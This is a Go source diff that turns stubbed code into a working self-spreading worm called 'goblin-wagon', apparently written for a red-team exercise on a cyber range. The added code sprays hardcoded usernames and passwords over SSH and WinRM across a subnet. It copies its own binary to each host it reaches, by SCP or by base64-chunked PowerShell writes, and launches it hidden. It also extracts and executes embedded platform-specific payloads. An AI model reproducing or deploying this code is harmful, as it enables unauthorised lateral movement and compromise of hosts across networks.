@@ -2,18 +2,20 @@ package main
 
 import (
 	_ "embed"
-    // "os"
+    "context"
+    "encoding/base64"
+    "fmt"
+    "io"
+    "log"
+    "os"
     "os/exec"
-	"context"
-	"fmt"
-	"io"
-	// "net"
-	"runtime"
-	"sync"
+    "runtime"
+    "sync"
+    "time"
 	"unicode"
-	"log"
-	"github.com/masterzen/winrm"
-	"golang.org/x/crypto/ssh"
+
+    "github.com/masterzen/winrm"
+    "golang.org/x/crypto/ssh"
 )
 
 type Platform struct {
@@ -116,70 +118,150 @@ func run_SSH_cmds(ssh_client *ssh.Client, cmd string) error {
 
 }
 
-/*
-Look for next host to move to
-
-1. Look at DNS records
-
-2. Brute force connection by trying WinRM or SSH
-*/
 func spread() {
-	exclusion_list := []string{
-		// Our team systems
-		"10.10.100.101",
-		"10.10.100.102",
-		"10.10.100.103",
-		"10.10.100.104",
-		"10.10.100.105",
-		"10.10.100.106",
-		"10.10.100.107",
-		"10.10.100.108",
-	}
+    exclusion_list := []string{
+        "10.10.100.101",
+        "10.10.100.102",
+        "10.10.100.103",
+        "10.10.100.104",
+        "10.10.100.105",
+        "10.10.100.106",
+        "10.10.100.107",
+        "10.10.100.108",
+    }
 
-	// Grey team systems that have to be excluded
-	for i := 200; i < 255; i++ {
-		exclusion_list = append(exclusion_list, fmt.Sprintf("%s.%d", "10.10.10", i))
-	} 
+    for i := 200; i < 255; i++ {
+        exclusion_list = append(exclusion_list, fmt.Sprintf("10.10.10.%d", i))
+    }
 
-	exclusion_map := make(map[string]bool)
-	for _, ip := range exclusion_list {
-		exclusion_map[ip] = true
-	}
+    exclusion_map := make(map[string]bool)
+    for _, ip := range exclusion_list {
+        exclusion_map[ip] = true
+    }
 
-	// target_hosts := reverse_lookup_hosts("10.10.10")
+    creds := []struct{ user, pass string }{
+        {"sjohnson",      "UwU?OwO!67"},
+        {"Administrator", "UwU?OwO!67"},
+        {"cyberrange",    "Cyberrange123!"},
+        {"root",          "Cyberrange123!"},
+    }
 
-	// for _, host_ip := range target_hosts {
+    target_hosts := discover_hosts("10.10.10")
 
-	// 	// Skip IPs that are not in target scope
-	// 	if exclusion_map[host_ip] {
-	// 		continue
-	// 	}
+    selfPath, _ := os.Executable()
+    selfData, err := os.ReadFile(selfPath)
+    if err != nil {
+        log.Printf("[-] could not read self: %v", err)
+        return
+    }
 
-	// 	// ********************************************
-	// 	// Brute force connect to IPs via SSH or WinRM
-	// 	// ********************************************
+    var wg sync.WaitGroup
+    for _, host_ip := range target_hosts {
+        if exclusion_map[host_ip] {
+            continue
+        }
 
-	// 	// WinRM
-	// 	winrm_client, err := establish_winRM(host_ip, "sjohnson", "UwU?OwO!67")
-	// 	if err != nil {
-	// 		fmt.Println("Failed to WinRM to: " + host_ip)
-	// 	}
+        wg.Add(1)
+        go func(ip string) {
+            defer wg.Done()
+            done := make(chan string, 2)
 
-	// 	// Command to copy itself to new host
-	// 	run_WinRM_cmds(winrm_client, "ipconfig")
+            // try all creds via WinRM
+            go func() {
+                for _, c := range creds {
+                    client, err := establish_winRM(ip, c.user, c.pass)
+                    if err != nil {
+                        continue
+                    }
+                    log.Printf("[+] WinRM auth succeeded on %s with %s", ip, c.user)
+                    if err := drop_and_run_winrm(client, selfData); err != nil {
+                        log.Printf("[-] WinRM drop failed on %s: %v", ip, err)
+                        continue
+                    }
+                    done <- "winrm"
+                    return
+                }
+            }()
 
-	// 	// SSH
-	// 	ssh_client, err := establish_SSH(host_ip, "cyberrange", "Cyberrange123!")
-	// 	if err != nil {
-	// 		fmt.Println("Failed to SSH to: " + host_ip) // debugging
-	// 	}
-	// 	defer ssh_client.Close()
+            // try all creds via SSH
+            go func() {
+                for _, c := range creds {
+                    client, err := establish_SSH(ip, c.user, c.pass)
+                    if err != nil {
+                        continue
+                    }
+                    log.Printf("[+] SSH auth succeeded on %s with %s", ip, c.user)
+                    defer client.Close()
+                    if err := drop_and_run_ssh(client, selfData); err != nil {
+                        log.Printf("[-] SSH drop failed on %s: %v", ip, err)
+                        continue
+                    }
+                    done <- "ssh"
+                    return
+                }
+            }()
 
-	// 	// Command to copy itself to new host
-	// 	run_SSH_cmds(ssh_client, "echo hi")
+            select {
+            case method := <-done:
+                log.Printf("[+] spread to %s succeeded via %s", ip, method)
+            case <-time.After(30 * time.Second):
+                log.Printf("[-] spread to %s timed out", ip)
+            }
+        }(host_ip)
+    }
+    wg.Wait()
+}
 
-	// } 
+func drop_and_run_ssh(client *ssh.Client, data []byte) error {
+    session, err := client.NewSession()
+    if err != nil {
+        return err
+    }
+    defer session.Close()
 
+    // SCP the binary
+    go func() {
+        w, _ := session.StdinPipe()
+        defer w.Close()
+        fmt.Fprintf(w, "C0700 %d goblin-wagon\n", len(data))
+        w.Write(data)
+        fmt.Fprint(w, "\x00")
+    }()
+
+    if err := session.Run("scp -t /tmp/goblin-wagon"); err != nil {
+        return err
+    }
+
+    // execute
+    execSession, err := client.NewSession()
+    if err != nil {
+        return err
+    }
+    defer execSession.Close()
+
+    return execSession.Run("chmod +x /tmp/goblin-wagon && nohup /tmp/goblin-wagon &")
+}
+
+func drop_and_run_winrm(client *winrm.Client, data []byte) error {
+    encoded := base64.StdEncoding.EncodeToString(data)
+    tmpPath := `C:\Windows\Temp\goblin-wagon.exe`
+    chunkSize := 8000
+
+    run_WinRM_cmds(client, fmt.Sprintf(`powershell -Command "Remove-Item -Force '%s' -ErrorAction SilentlyContinue"`, tmpPath))
+
+    for i := 0; i < len(encoded); i += chunkSize {
+        end := i + chunkSize
+        if end > len(encoded) {
+            end = len(encoded)
+        }
+        cmd := fmt.Sprintf(`powershell -Command "$f=[System.Convert]::FromBase64String('%s'); $fs=[System.IO.File]::Open('%s',[System.IO.FileMode]::Append); $fs.Write($f,0,$f.Length); $fs.Close()"`,
+            encoded[i:end], tmpPath)
+        if err := run_WinRM_cmds(client, cmd); err != nil {
+            return fmt.Errorf("chunk write failed: %v", err)
+        }
+    }
+
+    return run_WinRM_cmds(client, fmt.Sprintf(`powershell -Command "Start-Process '%s' -WindowStyle Hidden"`, tmpPath))
 }
 
 //go:embed binaries/payload_linux_amd64
@@ -201,77 +283,81 @@ var payload_windows_386 []byte
 var payload_windows_arm64 []byte
 
 func main() {
-	fmt.Println(discover_hosts("10.10.10"))
-    // log.SetFlags(log.Ltime | log.Lshortfile)
-    // log.Println("[*] goblin-wagon starting")
+	
+    log.SetFlags(log.Ltime | log.Lshortfile)
+    log.Println("[*] goblin-wagon starting")
 
-    // host_os := runtime.GOOS
-    // arch    := runtime.GOARCH
+    host_os := runtime.GOOS
+    arch    := runtime.GOARCH
 
-    // log.Printf("[*] detected OS: %s | Arch: %s", host_os, arch)
+    log.Printf("[*] detected OS: %s | Arch: %s", host_os, arch)
 
-    // payloads := map[Platform][]byte{
-    //     {OS: "linux",   Arch: "amd64"}: payload_linux_amd64,
-    //     {OS: "linux",   Arch: "386"}:   payload_linux_386,
-    //     {OS: "linux",   Arch: "arm64"}: payload_linux_arm64,
-    //     {OS: "windows", Arch: "amd64"}: payload_windows_amd64,
-    //     {OS: "windows", Arch: "386"}:   payload_windows_386,
-    //     {OS: "windows", Arch: "arm64"}: payload_windows_arm64,
-    // }
+    payloads := map[Platform][]byte{
+        {OS: "linux",   Arch: "amd64"}: payload_linux_amd64,
+        {OS: "linux",   Arch: "386"}:   payload_linux_386,
+        {OS: "linux",   Arch: "arm64"}: payload_linux_arm64,
+        {OS: "windows", Arch: "amd64"}: payload_windows_amd64,
+        {OS: "windows", Arch: "386"}:   payload_windows_386,
+        {OS: "windows", Arch: "arm64"}: payload_windows_arm64,
+    }
 
-    // key := Platform{OS: host_os, Arch: arch}
-    // log.Printf("[*] looking up platform key: %+v", key)
+    key := Platform{OS: host_os, Arch: arch}
+    log.Printf("[*] looking up platform key: %+v", key)
 
-    // data, ok := payloads[key]
-    // if !ok {
-    //     log.Printf("[-] no payload matched for OS=%s Arch=%s -- bailing", host_os, arch)
-    //     return
-    // }
-    // log.Printf("[+] payload found, size: %d bytes", len(data))
+    data, ok := payloads[key]
+    if !ok {
+        log.Printf("[-] no payload matched for OS=%s Arch=%s -- bailing", host_os, arch)
+        return
+    }
+    log.Printf("[+] payload found, size: %d bytes", len(data))
 
-    // ext := ""
-    // if host_os == "windows" {
-    //     ext = ".exe"
-    // }
+    ext := ""
+    if host_os == "windows" {
+        ext = ".exe"
+    }
 
-    // tmp, err := os.CreateTemp("", "svc*"+ext)
-    // if err != nil {
-    //     log.Printf("[-] failed to create temp file: %v", err)
-    //     return
-    // }
-    // log.Printf("[*] temp file created: %s", tmp.Name())
+    tmp, err := os.CreateTemp("", "svc*"+ext)
+    if err != nil {
+        log.Printf("[-] failed to create temp file: %v", err)
+        return
+    }
+    log.Printf("[*] temp file created: %s", tmp.Name())
 
-    // n, err := tmp.Write(data)
-    // if err != nil {
-    //     log.Printf("[-] failed to write payload to temp file: %v", err)
-    //     return
-    // }
-    // log.Printf("[+] wrote %d bytes to temp file", n)
-    // tmp.Close()
+    n, err := tmp.Write(data)
+    if err != nil {
+        log.Printf("[-] failed to write payload to temp file: %v", err)
+        return
+    }
+    log.Printf("[+] wrote %d bytes to temp file", n)
+    tmp.Close()
 
-    // if err := os.Chmod(tmp.Name(), 0700); err != nil {
-    //     log.Printf("[-] chmod failed: %v", err)
-    //     return
-    // }
-    // log.Printf("[*] chmod 0700 applied")
+    if err := os.Chmod(tmp.Name(), 0700); err != nil {
+        log.Printf("[-] chmod failed: %v", err)
+        return
+    }
+    log.Printf("[*] chmod 0700 applied")
 
-    // cmd := exec.Command(tmp.Name())
-    // cmd.Stdout = os.Stdout  // pipe output so you can see what wagon.go is doing
-    // cmd.Stderr = os.Stderr
-    // log.Printf("[*] executing payload: %s", tmp.Name())
+    cmd := exec.Command(tmp.Name())
+    cmd.Stdout = os.Stdout  // pipe output so you can see what wagon.go is doing
+    cmd.Stderr = os.Stderr
+    log.Printf("[*] executing payload: %s", tmp.Name())
 
-    // if err := cmd.Run(); err != nil {
-    //     log.Printf("[-] payload execution failed: %v", err)
-    // } else {
-    //     log.Printf("[+] payload exited cleanly")
-    // }
+    if err := cmd.Run(); err != nil {
+        log.Printf("[-] payload execution failed: %v", err)
+    } else {
+        log.Printf("[+] payload exited cleanly")
+    }
 
-    // if err := os.Remove(tmp.Name()); err != nil {
-    //     log.Printf("[-] failed to remove temp file: %v", err)
-    // } else {
-    //     log.Printf("[*] temp file cleaned up")
-    // }
+    if err := os.Remove(tmp.Name()); err != nil {
+        log.Printf("[-] failed to remove temp file: %v", err)
+    } else {
+        log.Printf("[*] temp file cleaned up")
+    }
 
-    // log.Println("[*] goblin-wagon done")
+    log.Println("[*] goblin-wagon done")
+
+	spread()
+
+
 }
 	
